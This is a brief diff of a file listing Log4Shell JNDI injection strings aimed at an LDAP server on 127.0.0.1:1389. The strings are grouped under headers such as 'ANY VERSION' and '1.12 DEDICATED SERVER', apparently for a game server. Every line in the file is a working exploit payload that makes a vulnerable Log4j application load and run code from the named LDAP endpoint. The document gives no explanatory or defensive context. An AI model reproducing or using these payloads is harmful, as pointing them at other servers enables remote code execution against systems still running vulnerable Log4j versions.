@@ -1,5 +1,8 @@
-${jndi:ldap://127.0.0.1:1389/ServerTest}
+ANY VERSION
+${jndi:ldap://127.0.0.1:1389/SystemOut}
 
+1.12 DEDICATED SERVER
+${jndi:ldap://127.0.0.1:1389/ServerTest}
 ${jndi:ldap://127.0.0.1:1389/WinTheGame}
 ${jndi:ldap://127.0.0.1:1389/UnlockTruePotential}
 ${jndi:ldap://127.0.0.1:1389/MoreDakka}
